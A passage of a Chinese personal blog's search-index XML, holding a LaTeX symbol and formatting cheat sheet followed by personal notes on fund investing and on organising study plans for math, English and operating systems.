<td><img src="https://cdn.nlark.com/yuque/__latex/96a522b9753f0cfafb269471e6cb3b6a.svg#card=math&code=%5Cdiv&id=ZH77O"></td>
</tr>
<tr>
<td>\pm</td>
<td>±</td>
<td>\mp</td>
<td><img src="https://cdn.nlark.com/yuque/__latex/550fa21d7f26efbbdba9a320998e9408.svg#card=math&code=%5Cmp&id=MaysC"></td>
</tr>
<tr>
<td>\cdot</td>
<td>·</td>
<td></td>
<td></td>
</tr>
<tr>
<td>\cup</td>
<td><img src="https://cdn.nlark.com/yuque/__latex/b7a5f9ac73cf4375693727ecdd011b75.svg#card=math&code=%5Ccup&id=weFL7"></td>
<td>\cap</td>
<td><img src="https://cdn.nlark.com/yuque/__latex/3d2c7ef54fdc6f33d2f05767c6bb74d9.svg#card=math&code=%5Ccap&id=Af0Dr"></td>
</tr>
<tr>
<td>\setminus</td>
<td>\</td>
<td>\subset</td>
<td><img src="https://cdn.nlark.com/yuque/__latex/5bc159fa1c150eff8eef9fee091f1138.svg#card=math&code=%5Csubset&id=qUZuC"></td>
</tr>
<tr>
<td>\subseteq</td>
<td>⊆</td>
<td>\subsetneq</td>
<td><img src="https://cdn.nlark.com/yuque/__latex/8120b457264516f9be40c77f6919765f.svg#card=math&code=%5Csubsetneq&id=ZDeio"></td>
</tr>
<tr>
<td>\supset</td>
<td>⊃</td>
<td>\in</td>
<td><img src="https://cdn.nlark.com/yuque/__latex/470e99d8c9c2615aacaa30dbf04f9f50.svg#card=math&code=%5Cin&id=tGqaU"></td>
</tr>
<tr>
<td>\notin</td>
<td>∉</td>
<td>\emptyset</td>
<td><img src="https://cdn.nlark.com/yuque/__latex/0dac1faa31e319949178b040b44ed6ea.svg#card=math&code=%5Cemptyset&id=AOQbU"></td>
</tr>
<tr>
<td>\varnothing</td>
<td>∅</td>
<td></td>
<td></td>
</tr>
<tr>
<td>{n+1 \choose 2k }</td>
<td><img src="https://cdn.nlark.com/yuque/__latex/76f5aec9de8f8b3ddefb355a0bff0a66.svg#card=math&code=%7Bn%2B1%20%5Cchoose%202k%20%7D&id=VeDv6"></td>
<td>\binom{n+1}{2k}</td>
<td><img src="https://cdn.nlark.com/yuque/__latex/ba8c7e63f37a61ac67a7068b39217341.svg#card=math&code=%5Cbinom%7Bn%2B1%7D%7B2k%7D&id=reZQQ"></td>
</tr>
<tr>
<td>\to</td>
<td><img src="https://cdn.nlark.com/yuque/__latex/d59084f8d5c6229967c0d93bd3204205.svg#card=math&code=%5Cto&id=foB4g"></td>
<td>\rightarrow</td>
<td><img src="https://cdn.nlark.com/yuque/__latex/33b44e34aa35b8c4ecd0606453ee68e9.svg#card=math&code=%5Crightarrow&id=wIKrf"></td>
</tr>
<tr>
<td>\leftarrow</td>
<td><img src="https://cdn.nlark.com/yuque/__latex/1c4b6f6d50a08c763be1abeca063a01f.svg#card=math&code=%5Cleftarrow&id=DZxWi"></td>
<td>\Rightarrow</td>
<td><img src="https://cdn.nlark.com/yuque/__latex/d7e62ff1f9ebb4d97584ede054a0dca9.svg#card=math&code=%5CRightarrow&id=FQVWn"></td>
</tr>
<tr>
<td>\Leftarrow</td>
<td><img src="https://cdn.nlark.com/yuque/__latex/1f5819e54ef9505019e7ac60143758f4.svg#card=math&code=%5CLeftarrow&id=xy2Ak"></td>
<td>\mapsto</td>
<td><img src="https://cdn.nlark.com/yuque/__latex/4e813c345f577894b0c1e053a637e97d.svg#card=math&code=%5Cmapsto&id=BBWEK"></td>
</tr>
<tr>
<td>\land</td>
<td><img src="https://cdn.nlark.com/yuque/__latex/c5054f61f70dc1af3f7a40e385a0c24b.svg#card=math&code=%5Cland&id=Zmpq3"></td>
<td>\lor</td>
<td><img src="https://cdn.nlark.com/yuque/__latex/d9004dc46d0311f74a6567057b5e94d5.svg#card=math&code=%5Clor&id=CfV8U"></td>
</tr>
<tr>
<td>\lnot</td>
<td><img src="https://cdn.nlark.com/yuque/__latex/ae9d7b286388a0a28c6ef1f8c4100af4.svg#card=math&code=%5Clnot&id=NFDKw"></td>
<td>\forall</td>
<td><img src="https://cdn.nlark.com/yuque/__latex/e74dbb51ca536167508e8a301e28a7bc.svg#card=math&code=%5Cforall&id=KbteM"></td>
</tr>
<tr>
<td>\exists</td>
<td><img src="https://cdn.nlark.com/yuque/__latex/a121a1a192df6a8b98900d70c34aafd2.svg#card=math&code=%5Cexists&id=yb1Ma"></td>
<td>\top</td>
<td><img src="https://cdn.nlark.com/yuque/__latex/2df6c7e64ac032c3ceae0ff3542333e6.svg#card=math&code=%5Ctop&id=XcaHb"></td>
</tr>
<tr>
<td>\bot</td>
<td><img src="https://cdn.nlark.com/yuque/__latex/2905452b4866b721490103eeee0332e0.svg#card=math&code=%5Cbot&id=N78GF"></td>
<td>\vdash</td>
<td><img src="https://cdn.nlark.com/yuque/__latex/61c7fdc8da248b8ce4f89e11242aa60b.svg#card=math&code=%5Cvdash&id=RcD2R"></td>
</tr>
<tr>
<td>\vDash</td>
<td><img src="https://cdn.nlark.com/yuque/__latex/a28089a40fff6bc633abe4823b4ee899.svg#card=math&code=%5CvDash&id=eMdH3"></td>
<td></td>
<td></td>
</tr>
<tr>
<td>\star</td>
<td><img src="https://cdn.nlark.com/yuque/__latex/c50ec45c6548ceb5e58d718da748aa92.svg#card=math&code=%5Cstar&id=GhHV2"></td>
<td>\ast</td>
<td><img src="https://cdn.nlark.com/yuque/__latex/4465370cd3e46f95c5393f7b4723adb0.svg#card=math&code=%5Cast&id=zZMbo"></td>
</tr>
<tr>
<td>\oplus</td>
<td><img src="https://cdn.nlark.com/yuque/__latex/df723412b927e0f7659c7e766b3bb463.svg#card=math&code=%5Coplus&id=T3tIN"></td>
<td>\circ</td>
<td><img src="https://cdn.nlark.com/yuque/__latex/a11083d0ac107184134b2863c7f7c469.svg#card=math&code=%5Ccirc&id=w77Hx"></td>
</tr>
<tr>
<td>\bullet</td>
<td><img src="https://cdn.nlark.com/yuque/__latex/cea23f6fe174625795dbf85521e854ab.svg#card=math&code=%5Cbullet&id=phaDy"></td>
<td></td>
<td></td>
</tr>
<tr>
<td>\approx</td>
<td><img src="https://cdn.nlark.com/yuque/__latex/b87101e34279ae8a2c60bd9080f20799.svg#card=math&code=%5Capprox&id=fU5lU"></td>
<td>\sim</td>
<td><img src="https://cdn.nlark.com/yuque/__latex/99cc18bdbb17061cd85ddd580ff06806.svg#card=math&code=%5Csim&id=GwDTR"></td>
</tr>
<tr>
<td>\simeq</td>
<td><img src="https://cdn.nlark.com/yuque/__latex/21138d23000a095edaa1fac1fd665a18.svg#card=math&code=%5Csimeq&id=cqFB0"></td>
<td>\cong</td>
<td><img src="https://cdn.nlark.com/yuque/__latex/ada489f5c3cd62847f64f20abe5559dd.svg#card=math&code=%5Ccong&id=aubj6"></td>
</tr>
<tr>
<td>\equiv</td>
<td><img src="https://cdn.nlark.com/yuque/__latex/ed8cd2d9bdadeb1b9324ca9eb8e07f7d.svg#card=math&code=%5Cequiv&id=J5MxN"></td>
<td>\prec</td>
<td><img src="https://cdn.nlark.com/yuque/__latex/d46b0d0e48fa2183b9e6d5433c0fcf2f.svg#card=math&code=%5Cprec&id=l9AS1"></td>
</tr>
<tr>
<td>\lhd</td>
<td><img src="https://cdn.nlark.com/yuque/__latex/e562bd2d453bac2ce5f4612c8137704a.svg#card=math&code=%5Clhd&id=imN0O"></td>
<td>\therefore</td>
<td><img src="https://cdn.nlark.com/yuque/__latex/1c7fffe977a87d3cf4f617046bc561df.svg#card=math&code=%5Ctherefore&id=z9Kde"></td>
</tr>
<tr>
<td>\infty</td>
<td><img src="https://cdn.nlark.com/yuque/__latex/ded19e461c6fc600ca2fdb1aef1faeb0.svg#card=math&code=%5Cinfty&id=d8oJW"></td>
<td>\aleph_0</td>
<td><img src="https://cdn.nlark.com/yuque/__latex/aa9297ba83836329c7060c4945d32b4c.svg#card=math&code=%5Caleph_0&id=caN1T"></td>
</tr>
<tr>
<td>\nabla</td>
<td><img src="https://cdn.nlark.com/yuque/__latex/ad18d6dc75c75bb836990d63c34d4027.svg#card=math&code=%5Cnabla&id=IYnBA"></td>
<td>\partial</td>
<td><img src="https://cdn.nlark.com/yuque/__latex/3d63d510ef7ee224dcdee37c761d1c26.svg#card=math&code=%5Cpartial&id=MsKtl"></td>
</tr>
<tr>
<td>\Im</td>
<td><img src="https://cdn.nlark.com/yuque/__latex/4d8393cdc1015b0ebc19ee8af6140dc6.svg#card=math&code=%5CIm&id=CVjZt"></td>
<td>\Re</td>
<td><img src="https://cdn.nlark.com/yuque/__latex/051ca2fbd32f4bcaceaccb61d0093a32.svg#card=math&code=%5CRe&id=DVZhJ"></td>
</tr>
<tr>
<td>a \equiv b \pmod n</td>
<td><img src="https://cdn.nlark.com/yuque/__latex/ac1b639ec5961bff82f3203491d6e563.svg#card=math&code=a%20%5Cequiv%20b%20%5Cpmod%20n&id=VIYId"></td>
<td></td>
<td></td>
</tr>
<tr>
<td>\Idots</td>
<td><img src="https://cdn.nlark.com/yuque/__latex/94204d8b96b40787978cee295fb11454.svg#card=math&code=%5Cldots&id=F9Skg"></td>
<td>\cdots</td>
<td><img src="https://cdn.nlark.com/yuque/__latex/50f96a17cb49da63abb51134b6f8324c.svg#card=math&code=%5Ccdots&id=ROdcF"></td>
</tr>
<tr>
<td>\epsilon</td>
<td><img src="https://cdn.nlark.com/yuque/__latex/7c102e7a7d231bf935f9bc23417779a8.svg#card=math&code=%5Cepsilon&id=h5Nay"></td>
<td>\varepsilon</td>
<td><img src="https://cdn.nlark.com/yuque/__latex/c57c5f0e31d8960d9406bb149fced9e0.svg#card=math&code=%5Cvarepsilon&id=KEwwU"></td>
</tr>
<tr>
<td>\phi</td>
<td><img src="https://cdn.nlark.com/yuque/__latex/f547e08b7db926659f19deee4b4363d1.svg#card=math&code=%5Cphi&id=YaCmA"></td>
<td>\varphi</td>
<td><img src="https://cdn.nlark.com/yuque/__latex/881403b34487b79bc2ceeeed2c8ea87c.svg#card=math&code=%5Cvarphi&id=fOmd2"></td>
</tr>
<tr>
<td>\ell</td>
<td><img src="https://cdn.nlark.com/yuque/__latex/08843ad184698b2d78d7a39e060b9574.svg#card=math&code=%5Cell&id=J1qTA"></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<h2 id="文字操作"><a href="#文字操作" class="headerlink" title="文字操作"></a>文字操作</h2><h4 id="公式加粗"><a href="#公式加粗" class="headerlink" title="公式加粗"></a>公式加粗</h4><figure class="highlight latex"><table><tr><td class="code"><pre><span class="line"><span class="built_in">$</span><span class="keyword">\bm</span>&#123; .... &#125;<span class="built_in">$</span></span><br></pre></td></tr></table></figure>

<h4 id="文字加粗"><a href="#文字加粗" class="headerlink" title="文字加粗"></a>文字加粗</h4><figure class="highlight latex"><table><tr><td class="code"><pre><span class="line">&#123;<span class="keyword">\bf</span> ...&#125;</span><br></pre></td></tr></table></figure>

<h4 id="调整字体"><a href="#调整字体" class="headerlink" title="调整字体"></a>调整字体</h4><figure class="highlight latex"><table><tr><td class="code"><pre><span class="line">字体大小：</span><br><span class="line">七号 　　5.25pt 　　   1.845mm　　　　<span class="keyword">\tiny</span></span><br><span class="line">六号 　　7.875pt 　　 2.768mm　　　　 <span class="keyword">\scriptsize</span></span><br><span class="line">小五号 　9pt 　　　　  3.163mm　　　　 <span class="keyword">\footnotesize</span></span><br><span class="line">五号 　　10.5pt 　　   3.69mm　　　　 <span class="keyword">\small</span></span><br><span class="line">小四号 　12pt 　　　　4.2175mm　　　   <span class="keyword">\normalsize</span></span><br><span class="line">四号 　　13.75pt 　　 4.83mm　　　　   <span class="keyword">\large</span></span><br><span class="line">三号 　　15.75pt 　　 5.53mm　　　　   <span class="keyword">\Large</span></span><br><span class="line">二号 　　21pt 　　　　7.38mm          <span class="keyword">\LARGE</span></span><br><span class="line">一号 　　27.5pt 　　   9.48mm　　　　  <span class="keyword">\huge</span></span><br><span class="line">小初号 　36pt 　　　　12.65mm　　　　  <span class="keyword">\Huge</span></span><br><span class="line">初号 　　42pt 　　　　14.76mm		  </span><br><span class="line"></span><br><span class="line">使用方法：替换下面代码中的small即可</span><br><span class="line"></span><br><span class="line"><span class="keyword">\begin</span>&#123;small&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">\ldots</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">\end</span>&#123;small&#125;</span><br></pre></td></tr></table></figure>

<h3 id="其他操作"><a href="#其他操作" class="headerlink" title="其他操作"></a>其他操作</h3><h4 id="上下标"><a href="#上下标" class="headerlink" title="上下标"></a>上下标</h4><p>对于上标使用 下划线表示“ _ ” ；对于上标使用 “ ^ ”表示。比如 x i 2 x_i^2x<br>i<br>2</p>
<p> 的LaTex表达式为 $x_i^2$ 。</p>
<p>LaTex表达式中的上下标可以叠加的，就比如 x y z {x^y}^zx<br>y</p>
<p>z<br> 的LaTex表达式为 ${x^y}^z$ 或者 $x^{y^z}$</p>
<p>在此需要注意的是：LaTex表达式默认的是 “ _ ” “ ^ ” 之后的一位才是上下标的内容，对于超过一个字母的上下标需要使用 { } 将它括起来，比如x 2 i 2 + b x_{2i}^{2+b}x<br>2i<br>2+b</p>
<p> 的LaTex表达式为$x_{2i}^{2+b}$。<br><a href="https://blog.csdn.net/ViatorSun/article/details/82826664">
</a>x上加横线<br> 加^号：\hat{x}</p>
<p>加横线：\overline{x}</p>
<p>加宽^：\widehat{x}</p>
<p>加波浪线：\widetilde{x}</p>
<p>加一个点：\dot{x}</p>
<p>加两个点：\ddot{x}  </p>
<h4 id="表格"><a href="#表格" class="headerlink" title="表格"></a>表格</h4><ul>
<li>没有竖线</li>
</ul>
<figure class="highlight latex"><table><tr><td class="code"><pre><span class="line"><span class="keyword">\textbf</span>&#123;表格格式&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">\begin</span>&#123;tabular&#125;&#123;cc&#125;</span><br><span class="line"> <span class="keyword">\hline</span></span><br><span class="line"> <span class="keyword">\makebox</span>[0.4<span class="keyword">\textwidth</span>][c]&#123;符号&#125;	<span class="built_in">&amp;</span>  <span class="keyword">\makebox</span>[0.5<span class="keyword">\textwidth</span>][c]&#123;意义&#125; <span class="keyword">\\</span> <span class="keyword">\hline</span></span><br><span class="line"> D	    <span class="built_in">&amp;</span> 宽度（cm） <span class="keyword">\\</span> <span class="keyword">\hline</span></span><br><span class="line"> L	    <span class="built_in">&amp;</span> 长度（cm）  <span class="keyword">\\</span> <span class="keyword">\hline</span></span><br><span class="line"><span class="keyword">\end</span>&#123;tabular&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>有竖线</li>
</ul>
<figure class="highlight latex"><table><tr><td class="code"><pre><span class="line"><span class="keyword">\begin</span>&#123;table&#125;[htbp] <span class="comment">% htbp代表表格浮动位置</span></span><br><span class="line"><span class="comment">% 表格居中</span></span><br><span class="line"><span class="keyword">\centering</span></span><br><span class="line"><span class="comment">% 添加表头</span></span><br><span class="line"><span class="keyword">\caption</span>&#123;表格&#125;</span><br><span class="line"><span class="comment">% 创建table环境</span></span><br><span class="line"><span class="keyword">\begin</span>&#123;tabular&#125;&#123;|cc|c|&#125; <span class="comment">% 3个c代表3列都居中，也可以设置l或r，|代表竖线位置</span></span><br><span class="line"><span class="comment">%|CC|c|表示对其方式</span></span><br><span class="line"><span class="comment">% 表格的输入</span></span><br><span class="line"><span class="keyword">\hline</span>  <span class="comment">% 一条水平线</span></span><br><span class="line"><span class="comment">%$P$ &amp; 最优$k$值 \\ % \\为换行符 </span></span><br><span class="line"><span class="comment">%\hline</span></span><br><span class="line"><span class="keyword">\makebox</span>[0.4<span class="keyword">\textwidth</span>][c]&#123;<span class="built_in">$</span>P<span class="built_in">$</span>&#125;	<span class="built_in">&amp;</span>  <span class="keyword">\makebox</span>[0.5<span class="keyword">\textwidth</span>][c]&#123;最优<span class="built_in">$</span>k<span class="built_in">$</span>值&#125; <span class="keyword">\\</span> <span class="keyword">\hline</span></span><br><span class="line">0.1 <span class="built_in">&amp;</span> 32 <span class="keyword">\\</span></span><br><span class="line"><span class="keyword">\hline</span></span><br><span class="line">0.2 <span class="built_in">&amp;</span> 23 <span class="keyword">\\</span></span><br><span class="line"><span class="keyword">\hline</span></span><br><span class="line">1 <span class="built_in">&amp;</span> 10 <span class="keyword">\\</span></span><br><span class="line"><span class="keyword">\hline</span></span><br><span class="line"><span class="keyword">\end</span>&#123;tabular&#125;</span><br><span class="line"><span class="keyword">\end</span>&#123;table&#125;</span><br></pre></td></tr></table></figure>

<h4 id="图片"><a href="#图片" class="headerlink" title="图片"></a>图片</h4><figure class="highlight latex"><table><tr><td class="code"><pre><span class="line"><span class="keyword">\textbf</span>&#123;图片格式&#125;</span><br><span class="line"><span class="keyword">\begin</span>&#123;figure&#125;[h]</span><br><span class="line"><span class="keyword">\centering</span></span><br><span class="line"><span class="keyword">\includegraphics</span>[width=5cm]&#123;xxx.jpg&#125;</span><br><span class="line"><span class="keyword">\caption</span>&#123;图片标题&#125;</span><br><span class="line"><span class="keyword">\end</span>&#123;figure&#125;</span><br></pre></td></tr></table></figure>

<h4 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h4><h4 id="代码块"><a href="#代码块" class="headerlink" title="代码块"></a>代码块</h4><h3 id="页面操作"><a href="#页面操作" class="headerlink" title="页面操作"></a>页面操作</h3><ul>
<li>新建页面</li>
</ul>
<h3 id="常见问题"><a href="#常见问题" class="headerlink" title="常见问题"></a>常见问题</h3><ul>
<li>目录要编译两遍才能正常显示</li>
</ul>
<h3 id="页的基本操作"><a href="#页的基本操作" class="headerlink" title="页的基本操作"></a>页的基本操作</h3><figure class="highlight latex"><table><tr><td class="code"><pre><span class="line"><span class="comment">%%%想要另起一页</span></span><br><span class="line"><span class="keyword">\newpage</span></span><br><span class="line"></span><br><span class="line"><span class="comment">%%%一般下面这种用的多</span></span><br><span class="line"><span class="keyword">\clearpage</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight latex"><table><tr><td class="code"><pre><span class="line"><span class="keyword">\pagestyle</span>&#123;empty&#125;<span class="comment">%%整篇文章不显示</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">\thispagestyle</span>&#123;empty&#125;<span class="comment">%%仅当前页</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">\setcounter</span>&#123;page&#125;&#123;1&#125;<span class="comment">%%页号从正文开始</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight latex"><table><tr><td class="code"><pre><span class="line"><span class="comment">%设置页码数字类型</span></span><br><span class="line"><span class="keyword">\pagenumbering</span>&#123;digit type&#125;</span><br><span class="line"><span class="comment">%其中digit type有：</span></span><br><span class="line">arabic      <span class="comment">%阿拉伯数字(1,2,3,4)，默认样式</span></span><br><span class="line">roman      小写罗马数字(i,ii,iii,iv)</span><br><span class="line">Roman     大写罗马数字(I,II,III,IV)</span><br><span class="line">alph         小写拉丁字母(a,b,c,d)</span><br><span class="line">Aiph         大写拉丁字母(A,B,C,D)</span><br><span class="line"></span><br><span class="line"><span class="comment">%如果想让当前页不标页码，可使用</span></span><br><span class="line"><span class="keyword">\thispagestyle</span>&#123;empty&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>科研</category>
      </categories>
      <tags>
        <tag>latex</tag>
      </tags>
  </entry>
  <entry>
    <title>ManageMoneyNotes</title>
    <url>/2023/03/01/%E4%B8%AA%E4%BA%BA%E6%8A%80%E8%83%BD/ManageMoneyNotes/</url>
    <content><![CDATA[<h1 id="Manage-Money-Notes"><a href="#Manage-Money-Notes" class="headerlink" title="Manage Money Notes"></a>Manage Money Notes</h1><h2 id="投资经验"><a href="#投资经验" class="headerlink" title="投资经验"></a>投资经验</h2><ul>
<li><p>尽量不选择用债券型基金用于定投</p>
<ul>
<li>因为波动小, 定投效果不明显</li>
<li>经验一般是, 开始的时候一次性买相对大量的本金</li>
</ul>
</li>
</ul>
<h3 id="定投时间"><a href="#定投时间" class="headerlink" title="定投时间"></a>定投时间</h3><ul>
<li>月定投会比周定投更好</li>
<li>尽量不要选择在每月的1或2号定投</li>
<li>因为节假日多</li>
</ul>
<h3 id="定投是否设置止盈点和止损点"><a href="#定投是否设置止盈点和止损点" class="headerlink" title="定投是否设置止盈点和止损点"></a>定投是否设置止盈点和止损点</h3><ul>
<li>定投不需要设置止损点</li>
<li>但需要设置止盈点</li>
<li>如果是在债券的话就一开始投很多然后一年以后在取出来</li>
</ul>
]]></content>
      <categories>
        <category>个人思考</category>
      </categories>
  </entry>
  <entry>
    <title>LearningMethods</title>
    <url>/2023/03/01/%E4%B8%AA%E4%BA%BA%E7%9A%84%E6%80%9D%E8%80%83/LearningMethods/</url>
    <content><![CDATA[<h1 id="Learning-Methods"><a href="#Learning-Methods" class="headerlink" title="Learning Methods"></a>Learning Methods</h1><h2 id="Total"><a href="#Total" class="headerlink" title="Total"></a>Total</h2><ul>
<li><p>在一些规划问题不知道怎么解决的时候就去学习</p>
</li>
<li><p>规划问题都放在晚上解决</p>
</li>
<li><p>因为晚上没什么重要的学习任务</p>
</li>
<li><p>已经将娱乐设备进行了分离</p>
<ul>
<li>电脑 — 学习和工作</li>
<li>手机 — 负责生活</li>
</ul>
</li>
<li></li>
</ul>
<h2 id="Subject"><a href="#Subject" class="headerlink" title="Subject"></a>Subject</h2><h3 id="Math"><a href="#Math" class="headerlink" title="Math"></a>Math</h3><h3 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h3><h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><p>- </p>
]]></content>
      <categories>
        <category>个人思考</category>
      </categories>
  </entry>
  <entry>
    <title>LearningViews</title>
    <url>/2023/03/01/%E4%B8%AA%E4%BA%BA%E7%9A%84%E6%80%9D%E8%80%83/LearningViews/</url>
    <content><![CDATA[<h1 id="Learning-Views"><a href="#Learning-Views" class="headerlink" title="Learning Views"></a>Learning Views</h1><h2 id="Total"><a href="#Total" class="headerlink" title="Total"></a>Total</h2><h3 id="Leaning-Method"><a href="#Leaning-Method" class="headerlink" title="Leaning Method"></a>Leaning Method</h3><ul>
<li><p>我认为学习计划要分为日计划和月计划</p>
</li>
<li><p>至于是否要有周计划还有待考虑</p>
</li>
<li><p>月计划有点想时间规划表, 有明确的每日的作息计划</p>
</li>
<li><p>还有学科安排</p>
</li>
<li><p>而日计划有点像代办事项</p>
</li>
<li><p>要把看书写入学习计划</p>
</li>
<li><p>日学习计划应该按照事件进行划分</p>
</li>
<li><p>晚上自控力会很差,</p>
</li>
<li><p>可以把晚上的时间留出来, 当作海绵时间, 进行动态规划</p>
</li>
<li><p>四个维度因该</p>
</li>
<li><p>还有学习的时候到底可不可以听音乐</p>
</li>
<li><p>娱乐方式</p>
</li>
<li><p>不知道干什么的时候就去学习, 学习虽然不是全局最优解, 但一定是局部最优解</p>
</li>
<li><p>起床问题</p>
</li>
<li><p>学习不能求快, 贵在坚持, 要有计划</p>
</li>
<li><p>每天学习的首先先做的是完成计划</p>
</li>
<li><p>不要在手机上下载短视频app(经验之谈)</p>
</li>
<li><p>该选择什么学习方式快速进入学习状态</p>
</li>
<li><p>要掌握休息和学习之间快速转换的方法</p>
<ul>
<li>在一个地方学不进去的时候要换一下地方学习</li>
</ul>
</li>
<li><p>学习的时候听什么音乐</p>
<ul>
<li>上午——流行和经典</li>
<li>中午——周杰伦</li>
<li>下午——日语和港台音乐</li>
<li>晚上——欧美和韩国</li>
</ul>
</li>
<li><p>在开始正式学习前可以背15分钟的单词热身一下</p>
<ul>
<li>快速进入一下学习状态</li>
<li>问题就是那么单词该什么时候清空</li>
<li>这个学习方法应该是不行了</li>
</ul>
</li>
<li><p>娱乐方式</p>
<ul>
<li>不在下棋</li>
<li>手机只能</li>
</ul>
</li>
<li><p>用于时间规划的软件</p>
</li>
<li><p>下午不太适合学习新知识</p>
</li>
<li><p>下午适合刷题</p>
</li>
<li><p>下午的话可以听音乐防止犯困</p>
</li>
<li><p>感觉要对学习计划进行改革了</p>
<ul>
<li>要重新恢复周计划了</li>
<li>要把日计划进行删减了</li>
<li>还有重新定义一下月计划的作用了</li>
<li>还有年计划和学期计划</li>
<li>这些</li>
</ul>
</li>
<li><p>还有要不要用vim来做笔记</p>
</li>
</ul>
<ul>
<li></li>
</ul>
<ul>
<li><p>晚上洗澡过后就不要完各种电子产品了</p>
</li>
<li><p>运动的时间也要安排在作息安排中</p>
</li>
<li><p>还有一个问题就是平时写计划的时候是用英文还是中文</p>
</li>
<li><p>如何处理b站 的定位</p>
</li>
<li><p>宿舍不适合学习</p>
</li>
<li><p>应该说有床的地方都不太适合学习</p>
</li>
<li><p>清单软件</p>
</li>
<li><p>看书</p>
</li>
<li><p>不能长时间花在列计划上</p>
<ul>
<li>会有大脑疲劳的</li>
</ul>
</li>
<li><p>如何使用双屏</p>
</li>
<li></li>
</ul>
<h3 id="学习计划规划思路"><a href="#学习计划规划思路" class="headerlink" title="学习计划规划思路"></a>学习计划规划思路</h3><h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><h4 id="日计划"><a href="#日计划" class="headerlink" title="日计划"></a>日计划</h4><ul>
<li>把时间规划去掉</li>
<li>因为每天情况都是不一样的</li>
<li>不能按照时间段来划分</li>
<li>应该按照任务量来划分</li>
<li>应该用以来清单的软件来完成比较合适</li>
</ul>
<h4 id="周计划"><a href="#周计划" class="headerlink" title="周计划"></a>周计划</h4><ul>
<li>每周日的上午制定下一周的周计划</li>
<li>周计划主要是对这一周会发生的事情提前安排</li>
<li>及时调整学习计划</li>
</ul>
<h4 id="月计划"><a href="#月计划" class="headerlink" title="月计划"></a>月计划</h4><ul>
<li><p>在每个月的最后一个周末制定下一个月的与月计划</p>
</li>
<li><p>月计划</p>
<ul>
<li>提出具体的学习时间</li>
<li>以及具体的学习计划</li>
</ul>
</li>
</ul>
<h4 id="年计划"><a href="#年计划" class="headerlink" title="年计划"></a>年计划</h4><ul>
<li><p>我觉的年计划未免有点长了</p>
<ul>
<li>感觉效果不是很好</li>
<li>感觉可以缩短点时间</li>
<li>年计划可以包含学期计划</li>
</ul>
</li>
<li><p>年计划的话，可以在年初或这年末制定</p>
<ul>
<li>学期计划同理</li>
</ul>
</li>
<li><p>年计划的意义：</p>
<ul>
<li>主要是相当于行动指南</li>
<li>大概要完成什么</li>
</ul>
</li>
<li><p>具体的文件夹</p>
<ul>
<li><p>2022</p>
<ul>
<li><p>年计划（2022.00）</p>
<ul>
<li>总年计划</li>
<li>半年计划</li>
<li>学期计划</li>
</ul>
</li>
<li><p>一月计划</p>
<ul>
<li>周计划</li>
</ul>
</li>
<li><p>……</p>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="Subjects"><a href="#Subjects" class="headerlink" title="Subjects"></a>Subjects</h2><h3 id="Computer-Prefossional-Knowledge"><a href="#Computer-Prefossional-Knowledge" class="headerlink" title="Computer Prefossional Knowledge"></a>Computer Prefossional Knowledge</h3><h4 id="Algorithm"><a href="#Algorithm" class="headerlink" title="Algorithm"></a>Algorithm</h4><h5 id="英文算法书"><a href="#英文算法书" class="headerlink" title="英文算法书"></a>英文算法书</h5><ul>
<li>最近时间安排不过来看书</li>
</ul>
<h5 id="算法总结"><a href="#算法总结" class="headerlink" title="算法总结"></a>算法总结</h5><ul>
<li>关于语言的描述, 选择C描述, 但是只使用面向过程,不是用面向对象, 因为算法题普遍比较简短最多只有几百行, 同时c有stl可以减少时间, 同时采用c和c混合编程, 因为C语言的输入输出会比c的输入输出更快</li>
<li></li>
</ul>
<h5 id="刷题"><a href="#刷题" class="headerlink" title="刷题"></a>刷题</h5><h4 id="Operatin-Systems"><a href="#Operatin-Systems" class="headerlink" title="Operatin Systems"></a>Operatin Systems</h4><ul>
<li>目前采取的策略是汇编部分和编程部分先不看, 等后面再回头看</li>
<li>先把一些概念学清楚</li>
<li>全部的都学过一遍才来做实验</li>
<li>争取做到能改操作系统的能力</li>
<li>把实验都做完以后可以看看机哥的视频</li>
<li>复习一下并且, 要想数据结构一样做一个笔记</li>
<li>同时后面可以看一下mit的os课程</li>
<li>做一个小型的操作系统</li>
<li>目前的问题是概念都知道的一些</li>
<li>但是看不懂源码, 上课的时候代码部分都是直接跳的</li>
<li>只能是通过实验来弥补了</li>
</ul>
<hr>
<h3 id="English"><a href="#English" class="headerlink" title="English"></a>English</h3><h4 id="当前规划"><a href="#当前规划" class="headerlink" title="当前规划"></a>当前规划</h4><ul>
<li>目前要怎么规划单词的背诵计划</li>
<li>要不要把一些多的单词退回去</li>
<li>这300个单词感觉很能在短时间能消化完</li>
<li>单词太多会导致单词背了两小时</li>
<li>已经把单词退回去重新背了</li>
<li>这下的节奏就刚刚好</li>
</ul>
<h4 id="Words"><a href="#Words" class="headerlink" title="Words"></a>Words</h4><ul>
<li>感觉单词太多了, 背不完</li>
<li>不能一下子背太多单词</li>
<li>但是太慢了又结束不了</li>
<li>感觉要不然准备两份单词软件</li>
<li>以不背单词为主</li>
<li>或这提高每天背单词的单词量</li>
<li>把每天背10个提高为每天背20个</li>
<li>按照这样的速度 , 600的单词背完需要一个月</li>
<li>极大的提高的了速度</li>
<li>同时为了提高单词背诵的质量可以</li>
</ul>
<hr>
<h3 id="Math"><a href="#Math" class="headerlink" title="Math"></a>Math</h3><h4 id="当前规划-1"><a href="#当前规划-1" class="headerlink" title="当前规划"></a>当前规划</h4><ul>
<li>到底是先学那一个</li>
<li>线性代数还是概率论</li>
<li>学完这些还是有数学分析和离散数学</li>
</ul>
<h4 id="数学建模"><a href="#数学建模" class="headerlink" title="数学建模"></a>数学建模</h4><h4 id="Probabilty-Theory"><a href="#Probabilty-Theory" class="headerlink" title="Probabilty Theory"></a>Probabilty Theory</h4><ul>
